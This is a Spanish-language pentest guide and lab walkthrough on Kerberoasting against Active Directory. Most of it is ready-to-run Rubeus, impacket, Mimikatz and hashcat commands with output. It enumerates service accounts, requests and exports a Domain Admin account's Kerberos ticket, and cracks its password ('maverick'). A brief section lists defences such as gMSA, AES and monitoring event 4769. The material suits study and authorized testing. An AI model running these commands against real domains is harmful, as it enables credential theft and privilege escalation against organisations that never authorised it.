
# Kerberoasting

### ¿Qué es Kerberoasting?

Ataque que permite obtener hashes de contraseñas de **cuentas de servicio** (usuarios con SPN registrado) del dominio. A diferencia de AS-REP Roasting, **requiere tener credenciales de un usuario válido del dominio** (cualquier usuario, sin privilegios).

***

## <mark style="color:$primary;">Cheatsheet</mark>

<table data-header-hidden><thead><tr><th width="190.33331298828125"></th><th></th><th></th></tr></thead><tbody><tr><td>Tarea</td><td>Windows</td><td>Kali Linux</td></tr><tr><td><strong>Enumerar PowerView</strong></td><td><code>Get-DomainUser -SPN</code> </td><td>N/A</td></tr><tr><td><strong>Enumerar AD Module</strong></td><td><code>Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName</code> </td><td>N/A</td></tr><tr><td><strong>Obtener todos los tickets</strong></td><td><code>Rubeus.exe kerberoast /nowrap</code></td><td><code>impacket-GetUserSPNs dominio/usuario:pass -dc-ip &#x3C;IP> -request</code></td></tr><tr><td><strong>Formato hashcat</strong></td><td><code>Rubeus.exe kerberoast /nowrap /format:hashcat</code></td><td><code>impacket-GetUserSPNs dominio/usuario:pass -dc-ip &#x3C;IP> -request -format hashcat</code></td></tr><tr><td><strong>Solo RC4 (más crackeable)</strong></td><td><code>Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt</code> </td><td>N/A</td></tr><tr><td><strong>Ver estadísticas</strong></td><td><code>Rubeus.exe kerberoast /stats</code> </td><td>N/A</td></tr><tr><td><strong>SPN específico</strong></td><td><code>Rubeus.exe kerberoast /spn:servicio/equipo /nowrap</code></td><td><code>impacket-GetUserSPNs dominio/usuario -dc-ip &#x3C;IP> -request -spn "SPN"</code></td></tr><tr><td><strong>Con hash NT</strong></td><td>N/A</td><td><code>impacket-GetUserSPNs dominio/usuario -hashes :hashNT -dc-ip &#x3C;IP> -request</code></td></tr><tr><td><strong>Crackear (hashcat)</strong></td><td><code>hashcat -m 13100 hash.txt diccionario.txt</code></td><td><code>hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt</code></td></tr><tr><td><strong>Modo hashcat</strong></td><td>13100 (RC4), 19600 (AES128), 19700 (AES256)</td><td>13100, 19600, 19700</td></tr></tbody></table>

***

### 🪟 Desde Windows

#### Requisitos

* Estar en un equipo **unido al dominio**
* Tener **credenciales de dominio** (tu sesión de usuario)
* Herramienta **Rubeus.exe** (disponible en mi repositorio AD-Tools)

{% embed url="<https://github.com/afsh4ck/AD-Tools>" %}

#### Paso 1: Obtener todos los tickets Kerberoast

```bash
Rubeus.exe kerberoast /nowrap
```

Con formato listo para hashcat:

```bash
Rubeus.exe kerberoast /nowrap /format:hashcat
```

Con formato John:

```bash
Rubeus.exe kerberoast /nowrap /format:john
```

#### Paso 2: Obtener ticket de un SPN específico

```bash
Rubeus.exe kerberoast /spn:"HTTP/web.empresa.local" /nowrap
```

#### Paso 3: Usar credenciales específicas (si no usas las de la sesión)

```bash
Rubeus.exe kerberoast /domain:empresa.local /user:juan.perez /password:P@ssw0rd /nowrap
```

#### Paso 4: Guardar salida a archivo

```bash
Rubeus.exe kerberoast /nowrap /outfile:hashes.txt
```

#### Paso 5: Crackear con hashcat

```bash
hashcat -m 13100 hashes.txt diccionario.txt --force
```

***

### 🐉 Desde Kali Linux

#### Requisitos

* Acceso de red al Controlador de Dominio (puerto 88 Kerberos)
* Credenciales de un usuario del dominio (usuario/contraseña o hash NT)
* Herramienta **impacket-GetUserSPNs**

#### Paso 1: Obtener todos los tickets (con contraseña)

```bash
impacket-GetUserSPNs empresa.local/juan.perez:P@ssw0rd -dc-ip 192.168.1.10 -request
```

#### Paso 2: Formato listo para hashcat

```bash
impacket-GetUserSPNs empresa.local/juan.perez:P@ssw0rd -dc-ip 192.168.1.10 -request -format hashcat
```

#### Paso 3: Guardar a archivo

```bash
impacket-GetUserSPNs empresa.local/juan.perez:P@ssw0rd -dc-ip 192.168.1.10 -request -outputfile hashes.txt
```

#### Paso 4: Usar hash NT en lugar de contraseña

```bash
impacket-GetUserSPNs empresa.local/juan.perez -hashes aad3b435b51404eeaad3b435b51404ee:hashNT -dc-ip 192.168.1.10 -request
```

#### Paso 5: Con ticket de sesión (pass-the-ticket)

Primero obtén un ticket con Rubeus o impacket, luego:

```bash
export KRB5CCNAME=ticket.ccache
impacket-GetUserSPNs empresa.local/ -k -dc-ip 192.168.1.10 -request -no-pass
```

#### Paso 6: Crackear con hashcat

```bash
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt --force

# Con reglas
hashcat -m 13100 hashes.txt diccionario.txt -r /usr/share/hashcat/rules/best64.rule

# Con John
john --format=krb5tgs --wordlist=diccionario.txt hashes.txt
```

***

## <mark style="color:$primary;">Ejemplos prácticos</mark>

### Windows - Ataque completo

```powershell
# Obtener todos los hashes
C:\Tools\Rubeus.exe kerberoast /nowrap /format:hashcat > kerb_hashes.txt

# Ejemplo de salida:
# $krb5tgs$23$*usuario_svc$EMPRESA.LOCAL$service/equipo*$...
```

### Kali - Ataque con credenciales básicas

```bash
impacket-GetUserSPNs empresa.local/usuariocomun:Contraseña123 -dc-ip 10.10.10.10 -request
```

#### Kali - Si solo tienes el hash NT

```bash
impacket-GetUserSPNs empresa.local/juan.perez -hashes :3c8cbfa6a2c6f0a5f9e2d8c4a1b7e5f3 -dc-ip 10.10.10.10 -request
```

***

### 🔑 Modos de Hashcat para Kerberoasting

<table data-header-hidden><thead><tr><th width="147"></th><th></th><th></th></tr></thead><tbody><tr><td>Modo</td><td>Tipo de ticket</td><td>Descripción</td></tr><tr><td><strong>13100</strong></td><td>Kerberos 5 TGS-REP (etype 23)</td><td>El más común, RC4-HMAC</td></tr><tr><td>19600</td><td>Kerberos 5 TGS-REP (etype 17)</td><td>AES128</td></tr><tr><td>19700</td><td>Kerberos 5 TGS-REP (etype 18)</td><td>AES256</td></tr></tbody></table>

**Siempre usa 13100** a menos que sepas que el ticket usa AES (los tickets RC4 son los más débiles y comunes).

***

### 🆚 Diferencia entre AS-REP Roasting y Kerberoasting

<table data-header-hidden><thead><tr><th width="200.3333740234375"></th><th width="290.666748046875"></th><th></th></tr></thead><tbody><tr><td>Característica</td><td>AS-REP Roasting</td><td>Kerberoasting</td></tr><tr><td><strong>Credenciales previas</strong></td><td>❌ No requiere</td><td>✅ Sí requiere</td></tr><tr><td><strong>Objetivo</strong></td><td>Usuarios con preauth deshabilitado</td><td>Cuentas de servicio (con SPN)</td></tr><tr><td><strong>Herramienta Windows</strong></td><td><code>Rubeus asreproast</code></td><td><code>Rubeus kerberoast</code></td></tr><tr><td><strong>Herramienta Kali</strong></td><td><code>impacket-GetNPUsers</code></td><td><code>impacket-GetUserSPNs</code></td></tr><tr><td><strong>Modo hashcat</strong></td><td>18200</td><td>13100</td></tr></tbody></table>

***

### 🛡️ ¿Cómo protegerte de Kerberoasting?

* Usar **gMSA (Managed Service Accounts)** o **MSA** (contraseñas rotadas automáticamente)
* Contraseñas de servicio **largas y complejas** (>25 caracteres, aleatorias)
* Usar **AES** en lugar de RC4 para Kerberos
* Monitorear eventos: **ID 4769** con ticket RC4 (Servicio solicitando ticket)
* Cuentas de servicio **excluidas** de ser administradores de dominio

***

### 📌 Notas importantes

1. Kerberoasting **no genera alertas** si se hace correctamente
2. Las cuentas con **AdminCount=1** (administradores) son el objetivo principal
3. Si usas AES, necesitarás modo 19600 o 19700 (más difíciles de crackear)
4. Puedes combinar con **AS-REP Roasting** si encuentras usuarios vulnerables

***

## <mark style="color:$primary;">Lab:</mark> <mark style="color:$primary;"></mark><mark style="color:$primary;">**AD - Kerberoasting Attacks**</mark>

En este entorno de laboratorio, se accede mediante interfaz gráfica de usuario a un usuario de dominio llamado Investigación/Estudiante en una máquina con Windows Server 2012, que funciona como estación de trabajo. Esta estación de trabajo es vulnerable a ataques de Kerberoasting.

Tu tarea consiste en identificar cuentas con un Nombre Principal de Servicio (SPN) habilitado, lo que permite al atacante solicitar tickets TGS y extraer los hashes de las contraseñas. Al explotar esta vulnerabilidad, tu objetivo será obtener la contraseña descifrada de la cuenta identificada, lo que nos ayudará a comprometer datos o escalar privilegios en el entorno de Active Directory.

**Objetivo: Identificar las cuentas de usuario con el Nombre Principal de Servicio (SPN) habilitado, realizar un ataque Kerberoasting para extraer los hashes de las contraseñas y utilizar la contraseña descifrada para comprometer datos o escalar privilegios dentro de Active Directory.**

## Tarea 1

> Identificar las cuentas de usuario con el Service Principal Name (SPN) habilitado.

### Enumeración con Powerview

```powershell
PS C:\Users\student> cd c:/tools
PS C:\tools> powershell -ep bypass
PS C:\tools> Import-Module .\PowerView.ps1
```

```powershell
PS C:\tools> Get-Domainuser -SPN


logoncount                    : 0
badpasswordtime               : 1/1/1601 12:00:00 AM
description                   : Key Distribution Center Service Account
distinguishedname             : CN=krbtgt,CN=Users,DC=research,DC=SECURITY,DC=local
objectclass                   : {top, person, organizationalPerson, user}
name                          : krbtgt
primarygroupid                : 513
objectsid                     : S-1-5-21-1693200156-3137632808-1858025440-502
samaccountname                : krbtgt
logonhours                    : {255, 255, 255, 255...}
admincount                    : 1
codepage                      : 0
samaccounttype                : USER_OBJECT
showinadvancedviewonly        : True
accountexpires                : 1/1/1601 12:00:00 AM
cn                            : krbtgt
whenchanged                   : 5/31/2023 10:30:16 AM
instancetype                  : 4
objectguid                    : 389927ac-969c-4bdc-8b4f-68b0726f4cb9
lastlogon                     : 1/1/1601 12:00:00 AM
lastlogoff                    : 1/1/1601 12:00:00 AM
objectcategory                : CN=Person,CN=Schema,CN=Configuration,DC=SECURITY,DC=local
dscorepropagationdata         : {5/31/2023 10:30:16 AM, 5/31/2023 9:50:29 AM, 9/27/2021 9:21:25 AM, 1/1/1601 6:12:16
                                PM}
serviceprincipalname          : kadmin/changepw
memberof                      : CN=Denied RODC Password Replication Group,CN=Users,DC=research,DC=SECURITY,DC=local
whencreated                   : 9/27/2021 9:21:24 AM
iscriticalsystemobject        : True
badpwdcount                   : 0
useraccountcontrol            : ACCOUNTDISABLE, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
usncreated                    : 12300
countrycode                   : 0
pwdlastset                    : 9/27/2021 9:21:24 AM
msds-supportedencryptiontypes : 0
usnchanged                    : 36988

logoncount            : 0
badpasswordtime       : 1/1/1601 12:00:00 AM
distinguishedname     : CN=Stephen,CN=Users,DC=research,DC=SECURITY,DC=local
objectclass           : {top, person, organizationalPerson, user}
name                  : Stephen
objectsid             : S-1-5-21-1693200156-3137632808-1858025440-2610
samaccountname        : Stephen
admincount            : 1
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : 1/1/1601 12:00:00 AM
countrycode           : 0
whenchanged           : 1/14/2026 6:18:10 AM
instancetype          : 4
objectguid            : e1556a6c-0293-4267-b190-dc8eb216d6c4
lastlogon             : 1/1/1601 12:00:00 AM
lastlogoff            : 1/1/1601 12:00:00 AM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=SECURITY,DC=local
dscorepropagationdata : {1/14/2026 6:18:10 AM, 1/1/1601 12:00:00 AM}
serviceprincipalname  : ops/research.SECURITY.local:1434
memberof              : CN=Domain Admins,CN=Users,DC=research,DC=SECURITY,DC=local
whencreated           : 1/14/2026 6:09:37 AM
badpwdcount           : 0
cn                    : Stephen
useraccountcontrol    : NORMAL_ACCOUNT
usncreated            : 49208
primarygroupid        : 513
pwdlastset            : 1/14/2026 6:09:37 AM
usnchanged            : 49235
```

Observamos que el usuario Stephen tiene un SPN válido y podemos hacer kerberoasting contra él:

<table data-header-hidden><thead><tr><th width="201.6666259765625"></th><th width="299"></th><th></th></tr></thead><tbody><tr><td>Campo</td><td>Valor</td><td>Significado</td></tr><tr><td><strong>samaccountname</strong></td><td><code>Stephen</code></td><td>Usuario normal</td></tr><tr><td><strong>serviceprincipalname</strong></td><td><code>ops/research.SECURITY.local:1434</code></td><td>✅ <strong>SPN válido!</strong></td></tr><tr><td><strong>useraccountcontrol</strong></td><td><code>NORMAL_ACCOUNT</code></td><td>Cuenta <strong>habilitada</strong></td></tr><tr><td><strong>memberof</strong></td><td><code>Domain Admins</code></td><td>🚨 <strong>ES DOMAIN ADMIN</strong></td></tr><tr><td><strong>admincount</strong></td><td><code>1</code></td><td>Miembro de grupo protegido</td></tr></tbody></table>

***

## Tarea 2

> Solicitar un ticket TGS para el SPN especificado mediante Kerberos.

### Ver SPNs

Observamos que Stephen está en el grupo `ops/research.SECURITY.local:1434`, esto es fundamental para el siguiente paso:

```powershell
PS C:\tools> setspn -T research -Q */*

Checking domain DC=research,DC=SECURITY,DC=local
CN=krbtgt,CN=Users,DC=research,DC=SECURITY,DC=local
        kadmin/changepw
CN=Stephen,CN=Users,DC=research,DC=SECURITY,DC=local
        ops/research.SECURITY.local:1434
<----SNIP---->
```

### Ver tickets en memoria

Observamos que está presente el ticket de Stephen (`ops/research.SECURITY.local`)

```powershell
PS C:\tools> klist

Current LogonId is 0:0x419d9

Cached Tickets: (6)

<----SNIP---->

#2>     Client: student @ RESEARCH.SECURITY.LOCAL
        Server: ops/research.SECURITY.local:1434 @ RESEARCH.SECURITY.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 4/27/2026 17:55:34 (local)
        End Time:   4/28/2026 3:44:22 (local)
        Renew Time: 5/4/2026 17:44:22 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called: prod.research.SECURITY.local
```

### Importar tokens kerberos a nuestra sesión

{% hint style="info" %}
Este paso es necesario para exportar correctamente los tickets Kerberos
{% endhint %}

```powershell
PS C:\tools> Add-Type -AssemblyName System.IdentityModel
PS C:\tools> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ops/research.SECURITY.local:1434"

Id                   : uuid-5d15653b-9f58-4f0e-8412-688a3dff3f74-1
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
ValidFrom            : 4/27/2026 5:55:34 PM
ValidTo              : 4/28/2026 3:44:22 AM
ServicePrincipalName : ops/research.SECURITY.local:1434
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
```

### Exportar TGS con Rubeus

```powershell
PS C:\tools> ./Rubeus.exe kerberoast /spn:"ops/research.SECURITY.local:1434" /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.0


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.


[*] Target SPN             : ops/research.SECURITY.local:1434
[*] Hash                   : $krb5tgs$23$*USER$DOMAIN$ops/research.SECURITY.local:1434*$9E011817EB1EFEB6A397D8B127D07BB6
$2CAB7A750F302E50C94FDC4958A95259E2EEFF82288AA731F6A69BFD2887861ED899FCFFBDD4D59C5B9FB32909A2CF7BE0978F2BBC8F56C5412036A
3190BC2AD8720339DF2D1A26E91F8F85E1D5EC1E4A4352394ACFCFB0B17DA9B7FF0F2EEFE16530062ED454ED22F8BF42B85BE6C264BFDB02CBECAD49
86BA4E9C4AADC630AF2E9AC5CE3176282B5C6C3CEFC73DA395587AD2A2DD208284760BF5D330498CB4B8C74A411B451D72948E115996F89E5F6E6DE1
034D801AEF10CAA1911FE5EC2ABC570F16AE5F003C152A47E68C5FFBBFD27E757F1971DB1B0A4E1DA2F52AB36ECCBFF841E42E6468646D4D44F97650
CBB547F73D92836ED470678DC1F2F666ACAF9DAE7465F2A7F84E5D8087880964CC215F1CEEC59029D51EAD3D69BB88E734D9E3285B5ADB9D99950F3E
E73F1322CBA4E24683DA6CA81B309050122E184212BF7EB14C08037FF1EACC71BD50F57B2B43817817A80D5EA732B2266C6F05CE299ADEE57F737419
E8602D7EC1C50EF065BE230670A320317DD93EF921C18476A34E6B1D46EC348E5FCB774EFFFD5CB2BFF08565D2824265023DB9C7B11D3E6D9B2C7CEB
380F3D9D875F61098CBA5839E742DC0BB34C83023C2520D406111CB12FA07FDED9D00FB377C58C81CC1C60D12B969963E1D44F23321648C62E7E82D4
6BCEB5981B063F5395FD295287CD1E127B89D3BAF7667C45B597128019660DE231D7B4E134BFACEA01470310B343EE2B71BE157E13AF137D1CDAE4DF
023522011414D850817555307309992FFC55CEC401EF0835F591C07FB215D70C3AD5DC42B35748A6551AC011C301B2227F072C80DA280349CB074342
D5373D751E48DEC2FA3B7BB05700819799627556285A6565004ED86F88D6F4AF78DD452C7293B2206815398493CEEB5EE0295FA1651AE0778F6F6C58
CF6E11BEBFB317965085E746785C961F659BF610C27ABB75FEDA249C15314805C9DCFD93CF6BE6994AD67F11113C67BDDA95F5D5D6474A69F7B16A2E
AC0B84B1637359FD0B0F8FFBCC296B176332B26366D34B720A6D04301F580A9842C4F81BB95F11330D60B943AFE56A82E95DB03F6085DE2968D82BCC
990F5BCE6BCCD1D5D9EADFCF72D404966329576083FBECE2A71EF5C7379EE8AD8BB86BAE39668E6C73DDA3326AE8A1FB32C0009308CAA17FD7632D0E
C1822F32B1236D65547C8CFDE09D253F68AD1BDD467A92A3C99AB2CDFC203D4DA63BC28E0ED480D1B9D06E8860BC4BFD874B562DD77A9A6F2E8710E0
DD431723612DB3BA993F094B53D6887D7FD8E1EA5D56526E3BF96270F03A78528F1406855F74192B2511074927A670E16FF57FC72D003FE031545C82
769C48D8F8641861ECDC6E45BB4338530C96745C4CE98ADD7D3C462E66699CE546490687DB9C971CEA5B8383FB83CB0F6A186286868BD70B46E1F3BE
FFC9E7FE990CCD76458F632D6DC16981AA827315A7632AA4EABEF35461887F6E7FE63ADD6163A867C0D13DC1676875B7983AFAF1D35F117A678889A2
367106AA6C85E843319BE577A5BD38A8D8E8CEA084C2703295DE579BFB8D9424C66638818EF91731A1F6B20BA0C5330B145
```

### Exportar TGS con Mimikatz

```powershell
PS C:\tools> Import-Module .\Invoke-Mimikatz.ps1
PS C:\tools> Invoke-Mimikatz -Command '"kerberos::list /export"'

Hostname: client.research.SECURITY.local / S-1-5-21-1693200156-3137632808-1858025440

  .#####.   mimikatz 2.2.0 (x64) #19041 Jun  9 2021 18:55:28
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # kerberos::list /export

[00000000] - 0x00000012 - aes256_hmac
   Start/End/MaxRenew: 4/27/2026 5:44:22 PM ; 4/28/2026 3:44:22 AM ; 5/4/2026 5:44:22 PM
   Server Name       : krbtgt/RESEARCH.SECURITY.LOCAL @ RESEARCH.SECURITY.LOCAL
   Client Name       : student @ RESEARCH.SECURITY.LOCAL
   Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ;
   * Saved to file     : 0-60a10000-student@krbtgt~RESEARCH.SECURITY.LOCAL-RESEARCH.SECURITY.LOCAL.kirbi

[00000001] - 0x00000012 - aes256_hmac
   Start/End/MaxRenew: 4/27/2026 5:44:22 PM ; 4/28/2026 3:44:22 AM ; 5/4/2026 5:44:22 PM
   Server Name       : krbtgt/RESEARCH.SECURITY.LOCAL @ RESEARCH.SECURITY.LOCAL
   Client Name       : student @ RESEARCH.SECURITY.LOCAL
   Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
   * Saved to file     : 1-40e10000-student@krbtgt~RESEARCH.SECURITY.LOCAL-RESEARCH.SECURITY.LOCAL.kirbi

[00000002] - 0x00000017 - rc4_hmac_nt
   Start/End/MaxRenew: 4/27/2026 5:55:34 PM ; 4/28/2026 3:44:22 AM ; 5/4/2026 5:44:22 PM
   Server Name       : ops/research.SECURITY.local:1434 @ RESEARCH.SECURITY.LOCAL
   Client Name       : student @ RESEARCH.SECURITY.LOCAL
   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
   * Saved to file     : 2-40a10000-student@ops~research.SECURITY.local~1434-RESEARCH.SECURITY.LOCAL.kirbi

[00000003] - 0x00000012 - aes256_hmac
   Start/End/MaxRenew: 4/27/2026 5:44:57 PM ; 4/28/2026 3:44:22 AM ; 5/4/2026 5:44:22 PM
   Server Name       : ldap/prod.research.security.local @ RESEARCH.SECURITY.LOCAL
   Client Name       : student @ RESEARCH.SECURITY.LOCAL
   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
   * Saved to file     : 3-40a50000-student@ldap~prod.research.security.local-RESEARCH.SECURITY.LOCAL.kirbi

[00000004] - 0x00000012 - aes256_hmac
   Start/End/MaxRenew: 4/27/2026 5:44:22 PM ; 4/28/2026 3:44:22 AM ; 5/4/2026 5:44:22 PM
   Server Name       : cifs/prod.research.security.local @ RESEARCH.SECURITY.LOCAL
   Client Name       : student @ RESEARCH.SECURITY.LOCAL
   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
   * Saved to file     : 4-40a50000-student@cifs~prod.research.security.local-RESEARCH.SECURITY.LOCAL.kirbi

[00000005] - 0x00000012 - aes256_hmac
   Start/End/MaxRenew: 4/27/2026 5:44:22 PM ; 4/28/2026 3:44:22 AM ; 5/4/2026 5:44:22 PM
   Server Name       : LDAP/prod.research.SECURITY.local/research.SECURITY.local @ RESEARCH.SECURITY.LOCAL
   Client Name       : student @ RESEARCH.SECURITY.LOCAL
   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
   * Saved to file     : 5-40a50000-student@LDAP~prod.research.SECURITY.local~research.SECURITY.local-RESEARCH.SECURITY.
LOCAL.kirbi
```

Eso directamente nos guarda los TGS localmente:

```powershell
PS C:\tools> ls

    Directory: C:\tools

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/27/2026   6:09 PM           1382 0-60a10000-student@krbtgt~RESEARCH.SECURITY.LOCAL-RESEARCH.SECURITY.LOCAL.kirbi
-a----        4/27/2026   6:09 PM           1416 1-40e10000-student@krbtgt~RESEARCH.SECURITY.LOCAL-RESEARCH.SECURITY.LOCAL.kirbi
-a----        4/27/2026   6:09 PM           1536 2-40a10000-student@ops~research.SECURITY.local~1434-RESEARCH.SECURITY.LOCAL.kirbi
-a----        4/27/2026   6:09 PM           1568 3-40a50000-student@ldap~prod.research.security.local-RESEARCH.SECURITY.LOCAL.kirbi
-a----        4/27/2026   6:09 PM           1568 4-40a50000-student@cifs~prod.research.security.local-RESEARCH.SECURITY.LOCAL.kirbi
-a----        4/27/2026   6:09 PM           1625 5-40a50000-student@LDAP~prod.research.SECURITY.local~research.SECURITY
<---SNIP--->
```

Y concretamente nos interesa el de `student@ops~research.SECURITY.local`

***

## Tarea 3

> Descifra la contraseña del ticket TGS usando Tgsrepcrack.

Encontramos la herramienta en la ruta `C:\Tools\kerberoast-Python3`

{% embed url="<https://github.com/nidem/kerberoast/tree/master>" %}

```powershell
PS C:\tools> python.exe .\kerberoast-Python3\tgsrepcrack.py .\10k-worst-pass.txt .\2-40a10000-student@ops~research.SECURITY.local~1434-RESEARCH.SECURITY.LOCAL.kirbi

    USE HASHCAT, IT'S HELLA FASTER!!

Cracking 1 tickets...
found password for ticket 0: maverick  File: .\2-40a10000-student@ops~research.SECURITY.local~1434-RESEARCH.SECURITY.LOCAL.kirbi
Successfully cracked all tickets
```

Encontramos la contraseña en plano: `maverick`
